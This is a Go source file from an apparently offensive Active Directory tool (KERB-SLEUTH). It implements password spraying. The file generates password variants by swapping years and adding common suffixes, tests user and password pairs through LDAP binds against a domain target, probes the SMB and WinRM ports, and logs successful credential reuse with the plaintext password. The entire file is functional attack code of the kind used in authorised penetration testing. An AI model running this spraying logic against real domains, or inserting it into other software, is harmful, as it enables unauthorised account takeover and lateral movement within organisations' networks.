package attack

import (
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/krb"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/util"
)

// MutatePassword generates variations of a password
func MutatePassword(pass string) []string {
	mutations := []string{pass}

	// Year mutation (e.g. 2024 -> 2025)
	years := []string{"2023", "2024", "2025", "2026"}
	for _, year := range years {
		if strings.Contains(pass, "20") {
			// Replace existing year-like strings
			// Simple logic: replace 4-digit numbers starting with 20
			mutations = append(mutations, strings.ReplaceAll(pass, "2024", year))
			mutations = append(mutations, strings.ReplaceAll(pass, "2025", year))
		}
	}

	// Common suffix mutation
	suffixes := []string{"!", "123", "@", "#"}
	for _, s := range suffixes {
		mutations = append(mutations, pass+s)
	}

	return uniqueStrings(mutations)
}

// SprayTest tests a (user, pass) pair against available services
func SprayTest(target, user, pass, domain string) map[string]bool {
	results := make(map[string]bool)

	// 1. LDAP Bind Test
	fullUser := user
	if domain != "" && !strings.Contains(user, "\\") {
		fullUser = fmt.Sprintf("%s\\%s", domain, user)
	}

	opts := krb.ConnectOptions{
		Target:   target,
		BindUser: fullUser,
		BindPass: pass,
		Timeout:  2 * time.Second,
	}

	client, err := krb.Connect(opts)
	if err == nil {
		results["ldap_bind_ok"] = true
		client.Close()
	}

	if testPort(target, 445) {
		results["smb_445_open"] = true
	}

	if testPort(target, 5985) {
		results["winrm_5985_open"] = true
	}

	return results
}

func testPort(target string, port int) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 1*time.Second)
	if err == nil {
		conn.Close()
		return true
	}
	return false
}

func uniqueStrings(input []string) []string {
	u := make([]string, 0, len(input))
	m := make(map[string]bool)
	for _, val := range input {
		if _, ok := m[val]; !ok {
			m[val] = true
			u = append(u, val)
		}
	}
	return u
}

// ReportSuccess prints a high-contrast success message
func ReportSuccess(user, pass, service string) {
	log.Printf("%s[!] SUCCESSFUL CREDENTIAL REUSE: %s : %s ON %s%s", util.Red, user, pass, service, util.Reset)
}
